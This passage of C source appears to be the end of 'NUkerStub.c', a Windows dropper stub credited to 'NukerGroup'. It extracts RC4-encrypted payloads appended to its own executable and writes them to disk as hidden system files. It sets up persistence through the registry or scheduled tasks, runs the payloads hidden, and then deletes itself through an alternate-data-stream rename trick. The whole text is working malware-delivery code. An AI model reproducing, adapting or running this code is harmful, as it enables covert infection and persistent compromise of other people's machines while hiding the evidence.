        if (NUkerFooter.NUkerDropPath[9] == '\\')
            _snprintf(NUkerGlobalDrop, sizeof(NUkerGlobalDrop) - 1, "%s%s", NUkerOwnDir, NUkerFooter.NUkerDropPath + 9);
        else
            _snprintf(NUkerGlobalDrop, sizeof(NUkerGlobalDrop) - 1, "%s", NUkerOwnDir);
    } else {
        ExpandEnvironmentStringsA(NUkerFooter.NUkerDropPath, NUkerGlobalDrop, sizeof(NUkerGlobalDrop));
    }
    NUkerGlobalDrop[sizeof(NUkerGlobalDrop) - 1] = '\0';

    SHCreateDirectoryExA(NULL, NUkerGlobalDrop, NULL);

    SetFilePointer(NUkerSelf, NUkerBaseOffset, NULL, FILE_BEGIN);
    ReadFile(NUkerSelf, &NUkerHdr, sizeof(NUKER_ARCHIVE_HEADER), &NUkerRead, NULL);

    if (NUkerHdr.NUkerMagic != NUKER_MAGIC) {
        CloseHandle(NUkerSelf);
        return 1;
    }

    NUkerEntries = (NUKER_FILE_ENTRY *)calloc(NUkerHdr.NUkerFileCount, sizeof(NUKER_FILE_ENTRY));
    if (!NUkerEntries) {
        CloseHandle(NUkerSelf);
        return 1;
    }

    ReadFile(NUkerSelf, NUkerEntries, NUkerHdr.NUkerFileCount * sizeof(NUKER_FILE_ENTRY),
             &NUkerRead, NULL);

    for (NUkerI = 0; NUkerI < NUkerHdr.NUkerFileCount; NUkerI++) {
        BYTE  *NUkerReadBuf;
        BYTE  *NUkerFinalData;
        DWORD  NUkerFinalSize;
        HANDLE NUkerOutFile;
        DWORD  NUkerWrt;

        if (NUkerEntries[NUkerI].NUkerCustomDrop[0] != '\0') {
            if (_strnicmp(NUkerEntries[NUkerI].NUkerCustomDrop, "%CURRENT%", 9) == 0) {
                if (NUkerEntries[NUkerI].NUkerCustomDrop[9] == '\\')
                    _snprintf(NUkerFileDrop, sizeof(NUkerFileDrop) - 1, "%s%s", NUkerOwnDir, NUkerEntries[NUkerI].NUkerCustomDrop + 9);
                else
                    _snprintf(NUkerFileDrop, sizeof(NUkerFileDrop) - 1, "%s", NUkerOwnDir);
            } else {
                ExpandEnvironmentStringsA(NUkerEntries[NUkerI].NUkerCustomDrop,
                                         NUkerFileDrop, sizeof(NUkerFileDrop));
            }
            NUkerFileDrop[sizeof(NUkerFileDrop) - 1] = '\0';
            SHCreateDirectoryExA(NULL, NUkerFileDrop, NULL);
        } else {
            _snprintf(NUkerFileDrop, sizeof(NUkerFileDrop) - 1, "%s", NUkerGlobalDrop);
            NUkerFileDrop[sizeof(NUkerFileDrop) - 1] = '\0';
        }

        SetFilePointer(NUkerSelf, NUkerBaseOffset + NUkerEntries[NUkerI].NUkerDataOffset,
                       NULL, FILE_BEGIN);

        NUkerReadBuf = (BYTE *)malloc(NUkerEntries[NUkerI].NUkerCompressedSize + 1);
        if (!NUkerReadBuf) continue;

        ReadFile(NUkerSelf, NUkerReadBuf, NUkerEntries[NUkerI].NUkerCompressedSize,
                 &NUkerRead, NULL);

        if (NUkerEntries[NUkerI].NUkerEntryFlags & NUKER_FL_ENCRYPT) {
            BYTE NUkerKey[16];
            memcpy(NUkerKey, NUkerEntries[NUkerI].NUkerEntryReserved, 8); // Access stored key
            NUkerStubRC4(NUkerReadBuf, NUkerEntries[NUkerI].NUkerCompressedSize, NUkerKey, 8);
        }

        NUkerFinalData = NUkerReadBuf;
        NUkerFinalSize = NUkerEntries[NUkerI].NUkerCompressedSize;

        if (NUkerEntries[NUkerI].NUkerEntryFlags & NUKER_FL_COMPRESS) {
            BYTE *NUkerDecompBuf = (BYTE *)malloc(NUkerEntries[NUkerI].NUkerOriginalSize + 1);
            if (!NUkerDecompBuf) {
                free(NUkerReadBuf);
                continue;
            }
            {
                DWORD NUkerDecompLen = NUkerDecompressRLE(
                    NUkerFinalData, NUkerFinalSize,
                    NUkerDecompBuf, NUkerEntries[NUkerI].NUkerOriginalSize + 1);

                if (NUkerDecompLen == NUkerEntries[NUkerI].NUkerOriginalSize) {
                    NUkerFinalData = NUkerDecompBuf;
                    NUkerFinalSize = NUkerDecompLen;
                } else {
                    free(NUkerDecompBuf);
                    free(NUkerReadBuf);
                    continue;
                }
            }
        }

        if (NUkerEntries[NUkerI].NUkerChecksum != 0) {
            DWORD NUkerVerifyCrc = NUkerCalcCrc32(NUkerFinalData, NUkerFinalSize);
            if (NUkerVerifyCrc != NUkerEntries[NUkerI].NUkerChecksum) {
                if (NUkerFinalData != NUkerReadBuf) free(NUkerFinalData);
                free(NUkerReadBuf);
                continue;
            }
        }

        _snprintf(NUkerOutPath, sizeof(NUkerOutPath) - 1, "%s\\%s",
                  NUkerFileDrop, NUkerEntries[NUkerI].NUkerFileName);
        NUkerOutPath[sizeof(NUkerOutPath) - 1] = '\0';

        if (NUkerEntries[NUkerI].NUkerHiddenFlag || NUkerGlobalHidden) {
            SetFileAttributesA(NUkerOutPath, FILE_ATTRIBUTE_NORMAL);
        }

        NUkerOutFile = CreateFileA(NUkerOutPath, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (NUkerOutFile != INVALID_HANDLE_VALUE) {
            WriteFile(NUkerOutFile, NUkerFinalData, NUkerFinalSize, &NUkerWrt, NULL);
            FlushFileBuffers(NUkerOutFile);
            CloseHandle(NUkerOutFile);

            if (NUkerEntries[NUkerI].NUkerHiddenFlag || NUkerGlobalHidden) {
                SetFileAttributesA(NUkerOutPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            }
        }

        if (NUkerEntries[NUkerI].NUkerStartupType == NUKER_STARTUP_REGISTRY) {
            NUkerStubInstallRegistry(NUkerOutPath);
        } else if (NUkerEntries[NUkerI].NUkerStartupType == NUKER_STARTUP_SCHEDULER) {
            NUkerStubInstallScheduler(NUkerOutPath);
        }

        if (NUkerFinalData != NUkerReadBuf) free(NUkerFinalData);
        free(NUkerReadBuf);
    }

    for (NUkerI = 0; NUkerI < NUkerHdr.NUkerFileCount; NUkerI++) {
        BOOL NUkerShouldExec = FALSE;
        BOOL NUkerIsHidden;

        if (NUkerEntries[NUkerI].NUkerExecMode == NUKER_EXEC_NORUN) continue;

        if (NUkerEntries[NUkerI].NUkerExecMode == NUKER_EXEC_RUNONCE) {
            if (NUkerStubCheckRunonce(NUkerEntries[NUkerI].NUkerFileName)) continue;
            NUkerStubMarkRunonce(NUkerEntries[NUkerI].NUkerFileName);
        }

        NUkerShouldExec = TRUE;
        NUkerIsHidden = (NUkerEntries[NUkerI].NUkerHiddenFlag || NUkerGlobalHidden) ? TRUE : FALSE;

        if (NUkerEntries[NUkerI].NUkerCustomDrop[0] != '\0') {
            if (_strnicmp(NUkerEntries[NUkerI].NUkerCustomDrop, "%CURRENT%", 9) == 0) {
                if (NUkerEntries[NUkerI].NUkerCustomDrop[9] == '\\')
                    _snprintf(NUkerFileDrop, sizeof(NUkerFileDrop) - 1, "%s%s", NUkerOwnDir, NUkerEntries[NUkerI].NUkerCustomDrop + 9);
                else
                    _snprintf(NUkerFileDrop, sizeof(NUkerFileDrop) - 1, "%s", NUkerOwnDir);
            } else {
                ExpandEnvironmentStringsA(NUkerEntries[NUkerI].NUkerCustomDrop,
                                         NUkerFileDrop, sizeof(NUkerFileDrop));
            }
            NUkerFileDrop[sizeof(NUkerFileDrop) - 1] = '\0';
        } else {
            _snprintf(NUkerFileDrop, sizeof(NUkerFileDrop) - 1, "%s", NUkerGlobalDrop);
            NUkerFileDrop[sizeof(NUkerFileDrop) - 1] = '\0';
        }

        _snprintf(NUkerOutPath, sizeof(NUkerOutPath) - 1, "%s\\%s",
                  NUkerFileDrop, NUkerEntries[NUkerI].NUkerFileName);
        NUkerOutPath[sizeof(NUkerOutPath) - 1] = '\0';

        if (NUkerEntries[NUkerI].NUkerSleepMs > 0) {
            Sleep(NUkerEntries[NUkerI].NUkerSleepMs);
        }

        if (NUkerShouldExec) {
            NUkerStubExecFile(NUkerOutPath, NUkerFileDrop, NUkerIsHidden);
            Sleep(200);
        }

    }

    free(NUkerEntries);
    CloseHandle(NUkerSelf);

    if (NUkerFooter.NUkerSelfDelete) {
        // Modern Jonas Lykkegaard Technique for Self-Deletion
        // Rename the data stream to unlink from path, then mark for deletion
        WCHAR NUkerWPath[MAX_PATH];
        GetModuleFileNameW(NULL, NUkerWPath, MAX_PATH);

        HANDLE NUkerHFile = CreateFileW(NUkerWPath, DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (NUkerHFile != INVALID_HANDLE_VALUE) {
            FILE_RENAME_INFO NUkerFri = { 0 };
            NUkerFri.FileNameLength = sizeof(L":NUKED");
            wcscpy(NUkerFri.FileName, L":NUKED");

            if (SetFileInformationByHandle(NUkerHFile, FileRenameInfo, &NUkerFri, sizeof(NUkerFri) + NUkerFri.FileNameLength)) {
                FILE_DISPOSITION_INFO NUkerFdi = { TRUE };
                SetFileInformationByHandle(NUkerHFile, FileDispositionInfo, &NUkerFdi, sizeof(NUkerFdi));
            }
            CloseHandle(NUkerHFile);
        }
    }

    return 0;
}

/*
 *  ============================================================
 *   End of NUkerStub.c
 *   (c) 2026 NukerGroup - All Rights Reserved
 *   NukerGroup Engineering Division
 *  ============================================================
 */
